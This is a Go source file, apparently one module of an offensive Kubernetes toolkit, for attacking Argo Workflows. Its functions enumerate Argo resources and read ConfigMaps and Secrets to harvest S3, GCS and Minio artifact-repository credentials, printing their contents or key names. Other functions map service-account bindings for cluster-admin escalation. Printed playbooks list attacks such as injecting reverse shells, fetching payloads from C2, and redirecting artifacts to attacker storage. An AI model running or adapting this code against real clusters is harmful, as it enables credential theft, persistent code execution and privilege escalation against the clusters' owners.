package cloudevasion

import (
	"context"
	"fmt"
	"strings"

	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/runtime/schema"
	"k8s.io/client-go/dynamic"
	"k8s.io/client-go/kubernetes"
)

var argoWorkflowTemplateGVR = schema.GroupVersionResource{
	Group: "argoproj.io", Version: "v1alpha1", Resource: "workflowtemplates",
}

var argoClusterWorkflowTemplateGVR = schema.GroupVersionResource{
	Group: "argoproj.io", Version: "v1alpha1", Resource: "clusterworkflowtemplates",
}

var argoWorkflowGVR = schema.GroupVersionResource{
	Group: "argoproj.io", Version: "v1alpha1", Resource: "workflows",
}

func detectArgoWorkflows(ctx context.Context, client kubernetes.Interface) []DetectionSystem {
	namespaces := []string{"argo", "argo-workflows", "argo-system"}
	for _, ns := range namespaces {
		pods, err := client.CoreV1().Pods(ns).List(ctx, metav1.ListOptions{
			LabelSelector: "app=workflow-controller",
		})
		if err == nil && len(pods.Items) > 0 {
			return []DetectionSystem{{
				Name:      "argo-workflows",
				Detected:  true,
				Namespace: ns,
				Details:   fmt.Sprintf("%d workflow-controller pods", len(pods.Items)),
			}}
		}

		pods, err = client.CoreV1().Pods(ns).List(ctx, metav1.ListOptions{
			LabelSelector: "app=argo-server",
		})
		if err == nil && len(pods.Items) > 0 {
			return []DetectionSystem{{
				Name:      "argo-workflows",
				Detected:  true,
				Namespace: ns,
				Details:   fmt.Sprintf("argo-server in %s", ns),
			}}
		}
	}

	return nil
}

// ExploitArgoWorkflows executes the specified Argo Workflows exploitation technique.
func ExploitArgoWorkflows(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface, technique string) (*EvasionResult, error) {
	switch technique {
	case "enumerate":
		return argoEnumerate(ctx, client, dynClient)
	case "template_inject":
		return argoTemplateInject(ctx, dynClient)
	case "artifact_steal":
		return argoArtifactSteal(ctx, client, dynClient)
	case "rbac_exploit":
		return argoRBACExploit(ctx, client)
	default:
		return argoEnumerate(ctx, client, dynClient)
	}
}

func argoEnumerate(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("Argo Workflows Enumeration:\n\n")

	found := false

	templates, err := dynClient.Resource(argoWorkflowTemplateGVR).Namespace("").List(ctx, metav1.ListOptions{})
	if err == nil && len(templates.Items) > 0 {
		found = true
		fmt.Fprintf(&sb, "  WorkflowTemplates (%d):\n", len(templates.Items))
		for _, tmpl := range templates.Items {
			fmt.Fprintf(&sb, "    %s/%s\n", tmpl.GetNamespace(), tmpl.GetName())
		}
		sb.WriteString("\n")
	}

	clusterTemplates, err := dynClient.Resource(argoClusterWorkflowTemplateGVR).List(ctx, metav1.ListOptions{})
	if err == nil && len(clusterTemplates.Items) > 0 {
		found = true
		fmt.Fprintf(&sb, "  ClusterWorkflowTemplates (%d):\n", len(clusterTemplates.Items))
		for _, tmpl := range clusterTemplates.Items {
			fmt.Fprintf(&sb, "    %s\n", tmpl.GetName())
		}
		sb.WriteString("\n")
	}

	workflows, err := dynClient.Resource(argoWorkflowGVR).Namespace("").List(ctx, metav1.ListOptions{})
	if err == nil && len(workflows.Items) > 0 {
		found = true
		running := 0
		for _, wf := range workflows.Items {
			status, _ := wf.Object["status"].(map[string]any)
			phase, _ := status["phase"].(string)
			if phase == "Running" {
				running++
			}
		}
		fmt.Fprintf(&sb, "  Workflows: %d total, %d running\n\n", len(workflows.Items), running)
	}

	namespaces := []string{"argo", "argo-workflows", "argo-system"}
	for _, ns := range namespaces {
		pods, err := client.CoreV1().Pods(ns).List(ctx, metav1.ListOptions{})
		if err == nil && len(pods.Items) > 0 {
			for _, pod := range pods.Items {
				fmt.Fprintf(&sb, "  Pod: %s/%s (phase=%s)\n", ns, pod.Name, pod.Status.Phase)
			}
		}
	}

	if !found {
		sb.WriteString("  No Argo Workflows resources detected\n")
	}

	return &EvasionResult{
		Technique: "enumerate",
		Success:   found,
		Output:    sb.String(),
	}, nil
}

func argoTemplateInject(ctx context.Context, dynClient dynamic.Interface) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("Argo Workflow Template Injection:\n\n")

	sb.WriteString("  WorkflowTemplates define reusable workflow steps.\n")
	sb.WriteString("  Injecting privileged containers into templates achieves persistent code execution.\n\n")

	templates, err := dynClient.Resource(argoWorkflowTemplateGVR).Namespace("").List(ctx, metav1.ListOptions{})
	if err != nil {
		fmt.Fprintf(&sb, "  Cannot list WorkflowTemplates: %v\n", err)
		return &EvasionResult{Technique: "template_inject", Success: false, Output: sb.String()}, nil
	}

	fmt.Fprintf(&sb, "  WorkflowTemplates (%d):\n", len(templates.Items))
	for _, tmpl := range templates.Items {
		spec, _ := tmpl.Object["spec"].(map[string]any)
		templatesList, _ := spec["templates"].([]any)

		fmt.Fprintf(&sb, "    %s/%s (%d steps)\n", tmpl.GetNamespace(), tmpl.GetName(), len(templatesList))
		for _, t := range templatesList {
			tMap, _ := t.(map[string]any)
			name, _ := tMap["name"].(string)

			if container, ok := tMap["container"].(map[string]any); ok {
				image, _ := container["image"].(string)
				fmt.Fprintf(&sb, "      Step '%s': image=%s\n", name, image)

				if secCtx, ok := container["securityContext"].(map[string]any); ok {
					if priv, _ := secCtx["privileged"].(bool); priv {
						fmt.Fprintf(&sb, "        [!] PRIVILEGED container\n")
					}
				}
			}

			if script, ok := tMap["script"].(map[string]any); ok {
				image, _ := script["image"].(string)
				source, _ := script["source"].(string)
				fmt.Fprintf(&sb, "      Script '%s': image=%s\n", name, image)
				if len(source) > 80 {
					source = source[:80] + "..."
				}
				fmt.Fprintf(&sb, "        Source: %s\n", source)
			}
		}
		sb.WriteString("\n")
	}

	clusterTemplates, _ := dynClient.Resource(argoClusterWorkflowTemplateGVR).List(ctx, metav1.ListOptions{})
	if clusterTemplates != nil && len(clusterTemplates.Items) > 0 {
		fmt.Fprintf(&sb, "  ClusterWorkflowTemplates (cluster-wide, %d):\n", len(clusterTemplates.Items))
		for _, tmpl := range clusterTemplates.Items {
			fmt.Fprintf(&sb, "    %s\n", tmpl.GetName())
		}
		sb.WriteString("\n")
	}

	sb.WriteString("  Template injection techniques:\n")
	sb.WriteString("    1. Add privileged container step to existing template\n")
	sb.WriteString("    2. Modify script source to include reverse shell/exfil\n")
	sb.WriteString("    3. Add init step that downloads payload from C2\n")
	sb.WriteString("    4. Inject volume mounts for host filesystem access\n")
	sb.WriteString("    5. Add serviceAccountName with cluster-admin binding\n")
	sb.WriteString("    6. Modify artifact output to exfiltrate to attacker storage\n")

	return &EvasionResult{
		Technique: "template_inject",
		Success:   len(templates.Items) > 0,
		Output:    sb.String(),
	}, nil
}

func argoArtifactSteal(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("Argo Workflows Artifact Repository Theft:\n\n")

	sb.WriteString("  Argo stores workflow artifacts (inputs/outputs) in S3/GCS/Minio.\n")
	sb.WriteString("  Artifact repository credentials give access to all workflow data.\n\n")

	namespaces := []string{"argo", "argo-workflows", "argo-system"}
	credFound := false
	for _, ns := range namespaces {
		configMaps, err := client.CoreV1().ConfigMaps(ns).List(ctx, metav1.ListOptions{})
		if err != nil {
			continue
		}
		for _, cm := range configMaps.Items {
			if strings.Contains(cm.Name, "workflow-controller") || cm.Name == "artifact-repositories" {
				fmt.Fprintf(&sb, "  ConfigMap: %s/%s\n", ns, cm.Name)
				for key, val := range cm.Data {
					if strings.Contains(key, "artifact") || strings.Contains(key, "s3") || strings.Contains(key, "gcs") {
						preview := val
						if len(preview) > 200 {
							preview = preview[:200] + "..."
						}
						fmt.Fprintf(&sb, "    %s:\n      %s\n", key, preview)
						credFound = true
					}
				}
			}
		}

		secrets, err := client.CoreV1().Secrets(ns).List(ctx, metav1.ListOptions{})
		if err == nil {
			for _, s := range secrets.Items {
				if strings.Contains(s.Name, "artifact") || strings.Contains(s.Name, "minio") || strings.Contains(s.Name, "s3") {
					credFound = true
					fmt.Fprintf(&sb, "  [CRED] %s/%s type=%s keys=%v\n", ns, s.Name, s.Type, secretKeys(s.Data))
				}
			}
		}
	}

	templates, _ := dynClient.Resource(argoWorkflowTemplateGVR).Namespace("").List(ctx, metav1.ListOptions{})
	if templates != nil {
		for _, tmpl := range templates.Items {
			spec, _ := tmpl.Object["spec"].(map[string]any)
			if artifactRepo, ok := spec["artifactRepositoryRef"].(map[string]any); ok {
				fmt.Fprintf(&sb, "  Template %s uses artifact repo: %v\n", tmpl.GetName(), artifactRepo)
			}
		}
	}

	sb.WriteString("\n  Artifact theft techniques:\n")
	sb.WriteString("    1. Extract S3/GCS/Minio credentials from workflow-controller-configmap\n")
	sb.WriteString("    2. Access artifact bucket directly — contains all workflow outputs\n")
	sb.WriteString("    3. Artifacts may contain: build outputs, test results, secrets, logs\n")
	sb.WriteString("    4. Minio often deployed in-cluster with default/weak credentials\n")
	sb.WriteString("    5. Modify artifact config to redirect outputs to attacker storage\n")

	return &EvasionResult{
		Technique: "artifact_steal",
		Success:   credFound,
		Output:    sb.String(),
	}, nil
}

func argoRBACExploit(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("Argo Workflows RBAC Exploitation:\n\n")

	sb.WriteString("  Argo workflow pods run under service accounts with varying permissions.\n")
	sb.WriteString("  Over-permissioned SAs allow escalation from within workflow steps.\n\n")

	namespaces := []string{"argo", "argo-workflows", "argo-system"}
	for _, ns := range namespaces {
		serviceAccounts, err := client.CoreV1().ServiceAccounts(ns).List(ctx, metav1.ListOptions{})
		if err != nil {
			continue
		}
		for _, sa := range serviceAccounts.Items {
			fmt.Fprintf(&sb, "  ServiceAccount: %s/%s\n", ns, sa.Name)
		}
	}

	clusterRoleBindings, err := client.RbacV1().ClusterRoleBindings().List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, crb := range clusterRoleBindings.Items {
			if !strings.Contains(crb.Name, "argo") {
				continue
			}
			fmt.Fprintf(&sb, "\n  ClusterRoleBinding: %s\n", crb.Name)
			fmt.Fprintf(&sb, "    Role: %s/%s\n", crb.RoleRef.Kind, crb.RoleRef.Name)
			for _, subj := range crb.Subjects {
				fmt.Fprintf(&sb, "    Subject: %s %s/%s\n", subj.Kind, subj.Namespace, subj.Name)
			}

			if crb.RoleRef.Name == "cluster-admin" || crb.RoleRef.Name == "admin" {
				sb.WriteString("    [CRITICAL] Cluster-admin level binding!\n")
			}
		}
	}

	roleBindings, err := client.RbacV1().RoleBindings("").List(ctx, metav1.ListOptions{})
	if err == nil {
		argoBindings := 0
		for _, rb := range roleBindings.Items {
			if strings.Contains(rb.Name, "argo") || strings.Contains(rb.Name, "workflow") {
				argoBindings++
				if argoBindings <= 5 {
					fmt.Fprintf(&sb, "\n  RoleBinding: %s/%s → %s\n", rb.Namespace, rb.Name, rb.RoleRef.Name)
				}
			}
		}
		if argoBindings > 5 {
			fmt.Fprintf(&sb, "  ... and %d more argo-related RoleBindings\n", argoBindings-5)
		}
	}

	sb.WriteString("\n  RBAC exploitation techniques:\n")
	sb.WriteString("    1. Workflow default SA often has pod create/delete (can spawn privileged)\n")
	sb.WriteString("    2. Submit workflow with serviceAccountName: cluster-admin SA\n")
	sb.WriteString("    3. Use Argo's artifact GC SA — often has broad secret access\n")
	sb.WriteString("    4. workflow-controller SA typically has cluster-wide pod management\n")
	sb.WriteString("    5. Submit workflow that mounts SA tokens from other namespaces\n")
	sb.WriteString("    6. Exploit templateRef to run ClusterWorkflowTemplate as elevated SA\n")

	return &EvasionResult{
		Technique: "rbac_exploit",
		Success:   true,
		Output:    sb.String(),
	}, nil
}
